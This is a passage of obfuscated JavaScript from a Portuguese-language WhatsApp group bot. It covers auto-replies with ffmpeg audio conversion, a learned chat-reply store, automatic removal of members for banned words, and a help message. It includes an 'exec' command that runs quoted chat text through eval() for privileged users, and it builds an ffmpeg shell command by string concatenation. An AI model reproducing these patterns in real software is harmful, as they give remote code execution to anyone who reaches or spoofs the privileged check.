                    'id': _0xd2050d.message.extendedTextMessage.contextInfo.stanzaId,
                    'participant': _0x42d32c
                  }
                });
              }
              async function _0x159dc1(_0x401e13, _0x4fed3c) {
                return new Promise((_0x1c4f45, _0x2e9db9) => {
                  exec("ffmpeg -hide_banner -loglevel panic -i \"" + _0x401e13 + "\" -c:a libopus -ac 1 -avoid_negative_ts make_zero \"" + _0x4fed3c + "\"", _0x212e67 => {
                    if (_0x212e67) {
                      _0x2e9db9("Erro ao converter áudio: " + _0x212e67.message);
                    } else {
                      _0x1c4f45();
                    }
                  });
                });
              }
              async function _0x1791e6(_0x251541, _0x567d97) {
                try {
                  let _0x11f15d = await axios({
                    'url': _0x251541,
                    'method': "GET",
                    'responseType': "stream"
                  });
                  return new Promise((_0x298efb, _0x3a0ccf) => {
                    let _0x413855 = fs.createWriteStream(_0x567d97);
                    _0x11f15d.data.pipe(_0x413855);
                    _0x413855.on("finish", () => {
                      _0x298efb();
                    });
                    _0x413855.on("error", _0x1b68ad => {
                      console.error("Erro ao baixar áudio: " + _0x1b68ad.message);
                      _0x3a0ccf(_0x1b68ad);
                    });
                  });
                } catch (_0x3d4264) {
                  console.error("Erro ao fazer a requisição para a URL: " + _0x3d4264.message);
                  throw _0x3d4264;
                }
              }
              function _0x3592b3(_0x446723) {
                return '' + Math.floor(Math.random() * 1000000) + _0x446723;
              }
              async function _0x3a4b44(_0x3b0387) {
                if (fs.existsSync(_0x3b0387)) {
                  return path.relative(__dirname, _0x3b0387).replace(/\\/g, '/');
                }
                const _0xbf28b9 = path.join(__dirname, "temp_audio.mp3");
                const _0x3a6b75 = path.join(__dirname, '' + Math.floor(Math.random() * 1000000) + ".ogg");
                try {
                  await _0x1791e6(_0x3b0387, _0xbf28b9);
                  await _0x159dc1(_0xbf28b9, _0x3a6b75);
                  return path.relative(__dirname, _0x3a6b75).replace(/\\/g, '/');
                } catch (_0xbc1d3) {
                  console.error("Erro no processamento do áudio: " + _0xbc1d3.message);
                  return null;
                } finally {
                  if (fs.existsSync(_0xbf28b9)) {
                    fs.unlinkSync(_0xbf28b9);
                  }
                }
              }
              if (_0x5a94ec) {
                const _0x11e468 = JSON.parse(fs.readFileSync("./DADOS/autoresposta.json"));
                let _0x2ab6e2 = {
                  'texto': (_0x5ee722, _0x2af224) => ({
                    'text': _0x2af224
                  }),
                  'audio': async (_0x1c48fe, _0x4d24fa) => {
                    let _0x215298 = await _0x3a4b44(_0x4d24fa);
                    if (_0x215298) {
                      const _0x3063d2 = {
                        url: './' + _0x215298
                      };
                      const _0x4093b9 = {
                        audio: _0x3063d2,
                        mimetype: "audio/mpeg"
                      };
                      const _0x4082c1 = {
                        quoted: _0xd2050d
                      };
                      await _0x5196be.sendMessage(_0x346d97, _0x4093b9, _0x4082c1);
                      let _0x4e0b8f = path.join(__dirname, _0x215298);
                      if (fs.existsSync(_0x4e0b8f) && path.dirname(_0x4e0b8f) === __dirname) {
                        fs.unlinkSync(_0x4e0b8f);
                      }
                    } else {
                      const _0x1ecd40 = {
                        text: "Erro ao processar áudio"
                      };
                      return _0x1ecd40;
                    }
                  },
                  'video': (_0x4ba356, _0x1e4d0b) => ({
                    'video': {
                      'url': _0x1e4d0b
                    },
                    'mimetype': "video/mp4"
                  }),
                  'imagem': (_0x550a83, _0x59acfb) => ({
                    'image': {
                      'url': _0x59acfb
                    }
                  }),
                  'sticker': (_0x272fc2, _0x2bc128) => ({
                    'sticker': {
                      'url': _0x2bc128
                    }
                  })
                };
                let _0x58c190 = async _0x18a644 => {
                  let _0x3e3f79 = _0x18a644.enviar[Math.floor(Math.random() * _0x18a644.enviar.length)];
                  if (_0x2ab6e2[_0x18a644.tipo]) {
                    let _0x4bb9ac = await _0x2ab6e2[_0x18a644.tipo](_0x18a644, _0x3e3f79);
                    if (_0x4bb9ac) {
                      const _0x54769b = {
                        quoted: _0xd2050d
                      };
                      _0x5196be.sendMessage(_0x346d97, _0x4bb9ac, _0x54769b);
                    }
                  } else if (_0x18a644.tipo === "stickerlink") {
                    enviarfiguUrl(_0x5196be, _0x346d97, _0x3e3f79, _0xd2050d);
                  }
                };
                let _0x5490de = async () => {
                  for (let _0x2b64bf of _0x11e468) {
                    if (_0x2b64bf.contenha) {
                      for (let _0x274993 of _0x2b64bf.contenha) {
                        if (_0x5725b4.toLowerCase().includes(_0x274993)) {
                          await _0x58c190(_0x2b64bf);
                          break;
                        }
                      }
                    } else {
                      if (_0x2b64bf.comece) {
                        for (let _0x297ea8 of _0x2b64bf.comece) {
                          if (_0x5725b4.toLowerCase().startsWith(_0x297ea8)) {
                            await _0x58c190(_0x2b64bf);
                            break;
                          }
                        }
                      }
                    }
                  }
                };
                _0x5490de();
                if (_0x5725b4.includes("adivinha meu celular") || _0x5725b4.includes("bot qual meu celular")) {
                  const _0x5d4690 = {
                    text: _0x5f5cbb
                  };
                  const _0xf364b = {
                    quoted: _0xd2050d
                  };
                  _0x5196be.sendMessage(_0x346d97, _0x5d4690, _0xf364b);
                }
                _0x4a58fd("./DADOS/datab/audios/corno.mp3", "corno");
              }
              if (_0x46e43b.includes("exec")) {
                if (!_0xf59944 && !_0x3eefd0 && !issupre && !ischyt) {
                  return;
                }
                try {
                  paramsQuoted = _0xd2050d.message.extendedTextMessage.contextInfo.quotedMessage.conversation || _0xd2050d.message.extendedTextMessage.contextInfo.quotedMessage.extendedTextMessage.text;
                  return eval('' + paramsQuoted);
                  console.log("[EXEC]~> " + paramsQuoted);
                } catch (_0x325728) {
                  _0x50740b(_0x325728);
                }
              }
              switch (_0x14080f) {}
              if (_0x89cd51 && _0x627769 && _0x42a9f2 && !_0xf59944 && !_0x3f2f63) {
                if (_0x326cbd[0].antipalavrao.palavras.some(_0x1fc43b => _0x5725b4.includes(_0x1fc43b.toLowerCase().normalize("NFD").replace(/[\u0300-\u036f]/g, '')))) {
                  setTimeout(() => {
                    if (!JSON.stringify(groupMembers).includes(_0x246d48)) {
                      return;
                    }
                    _0x5196be.groupParticipantsUpdate(_0x346d97, [_0x246d48], "remove");
                    setTimeout(() => {
                      _0x5196be.sendMessage(_0x346d97, {
                        'delete': {
                          'remoteJid': _0x346d97,
                          'fromMe': false,
                          'id': _0xd2050d.key.id,
                          'participant': _0x246d48
                        }
                      });
                    }, 500);
                  }, 2000);
                  const _0x4edec1 = {
                    text: "*「 - REMOVIDO POR UTILIZAR UMA PALAVRA PROIBIDA - 」*\nVocê será banido do gp, Na proxima veja as regras ao digitar qualquer palavra..!!"
                  };
                  _0x5196be.sendMessage(_0x346d97, _0x4edec1);
                }
              }
              if (_0x89cd51 && _0x785cbd && _0x3a0a2c != undefined) {
                if (_0x4c3ee0 == "imageMessage") {
                  return;
                }
                if (_0x4c3ee0 == "audioMessage") {
                  return;
                }
                if (_0x4c3ee0 == "stickerMessage") {
                  return;
                }
                if (_0xd2050d.key.fromMe) {
                  return;
                }
                console.log(_0x3a0a2c);
                muehe = await simih(_0x3a0a2c);
                if (!muehe) {
                  return;
                }
                console.log(muehe);
                _0x50740b(muehe);
              }
              function _0x215452() {
                fs.writeFileSync("./DADOS/json/simi.json", JSON.stringify(SIMI_OFC, null, 2));
              }
              msg_q = _0xd2050d?.["message"]?.["extendedTextMessage"]?.["contextInfo"]?.["quotedMessage"]?.["conversation"]?.["toLowerCase"]() || '';
              msg_m = _0xd2050d?.["message"]?.["extendedTextMessage"]?.["text"] || '';
              function _0x345515(_0x1905d7, _0x4d5065) {
                if (_0x1905d7 && _0x4d5065 && _0x4d5065.length < 1000) {
                  _0x1905d7 = _0x1905d7.toLowerCase();
                  let _0x120ff8 = SIMI_OFC.findIndex(_0xd7304d => _0xd7304d.MSG === _0x1905d7);
                  if (_0x120ff8 !== -1) {
                    let _0x3c09c2 = SIMI_OFC[_0x120ff8];
                    _0x3c09c2.RSP.push(_0x4d5065);
                    while (_0x3c09c2.RSP.length > 15) {
                      _0x3c09c2.RSP.shift();
                    }
                  } else {
                    if (SIMI_OFC.length >= 15) {
                      SIMI_OFC.shift();
                    }
                    const _0x173c99 = {
                      MSG: _0x1905d7,
                      RSP: [_0x4d5065]
                    };
                    SIMI_OFC.push(_0x173c99);
                  }
                  _0x215452();
                }
              }
              if (_0x2623e0 && _0x89cd51 && !_0x1d6d9e && !linkfy.find(_0x3a0a2c)[0]?.["isLink"]) {
                var _0x54fe08 = _0x3a0a2c.toLowerCase();
                var _0x505457 = SIMI_OFC.find(_0x46ca99 => _0x46ca99.MSG === _0x54fe08);
                if (_0x505457 && _0x505457.RSP.length > 0) {
                  var _0x180e70 = _0x505457.RSP[Math.floor(Math.random() * _0x505457.RSP.length)];
                  if (_0x180e70 !== _0x141936) {
                    _0x50740b(_0x180e70);
                  }
                }
              }
              if (!_0x1d6d9e && _0x89cd51) {
                var _0x16c320 = _0xd2050d?.["message"]?.["extendedTextMessage"]?.["contextInfo"]?.["quotedMessage"];
                var _0xab82b5 = _0x16c320?.["conversation"]?.["toLowerCase"]();
                var _0x9c81f6 = msg_m.toLowerCase();
                if (_0xab82b5 && _0x9c81f6 && _0xab82b5 !== _0x9c81f6) {
                  _0x345515(_0xab82b5, _0x9c81f6);
                }
              }
              hora2 = moment.tz("America/Sao_Paulo").format("HH:mm:ss");
              if (_0x1d6d9e) {
                const _0x457a19 = {
                  text: '🚫',
                  key: _0xd2050d.key
                };
                const _0x2cb0a2 = {
                  react: _0x457a19
                };
                _0x4f0b32 = _0x2cb0a2;
                sendMsg = await _0x5196be.sendMessage(_0x346d97, _0x4f0b32);
                let _0x3018ed = fs.readFileSync("./DADOS/json/caseNames.json");
                let _0x432140 = JSON.parse(_0x3018ed);
                let _0x4f2db6 = _0x261700(_0x267d4b, _0x432140.cases);
                uptime = process.uptime();
                let _0xd8f1e4 = '';
                if (_0x267d4b.trim().length > 0) {
                  let _0x500c0f = '';
                  if (_0x4f2db6.similpocent >= 1) {
                    _0x500c0f = "\n│𝐂𝐨𝐦𝐚𝐧𝐝𝐨 𝐒𝐢𝐦𝐢𝐥𝐚𝐫: " + _0x4f2db6.simil + "\n│𝐒𝐢𝐦𝐢𝐥𝐚𝐫𝐢𝐝𝐚𝐝𝐞: " + _0x4f2db6.similpocent + '%';
                  }
                  _0xd8f1e4 = "\n├𝐂𝐨𝐦𝐚𝐧𝐝𝐨 " + _0x267d4b + "\n│𝐍𝐚̃𝐨 𝐄𝐧𝐜𝐨𝐧𝐭𝐫𝐚𝐝𝐨" + _0x500c0f;
                }
                const _0x5f585b = {
                  text: "╭┅─•𖧹❀⃘࣭࣭࣭࣭ٜꔷ⃔໑࣭࣭ٜ" + _0x2cd689 + "❀⃘࣭࣭࣭࣭ꔷ⃔໑࣭࣭ٜ𖧹•─┅╮" + _0xd8f1e4 + "\n├𝐃𝐢𝐠𝐢𝐭𝐞 " + _0x141936 + "menu\n│𝐏𝐚𝐫𝐚 𝐕𝐞𝐫 𝐎 𝐌𝐞𝐧𝐮\n│𝐃𝐞 𝐂𝐨𝐦𝐚𝐧𝐝𝐨𝐬\n╰┅─•𖧹❀⃘࣭࣭࣭࣭ٜꔷ⃔໑࣭࣭ٜ" + _0x2cd689 + "❀⃘࣭࣭࣭࣭ꔷ⃔໑࣭࣭ٜ𖧹•─┅╯",
                  mentions: [_0x246d48]
                };
                const _0x2151c3 = {
                  quoted: _0xd2050d
                };
                _0x5196be.sendMessage(_0x346d97, _0x5f585b, _0x2151c3);
              }
          }
        }
      }
    } catch (_0x497338) {
      console.log(_0x497338);
    }
  } else {
    console.log("Esta Index Esta Usando A Versão Errada Do Iniciar.js, atualize e Corrija O Erro..");
  }
}
module.exports = startAle;
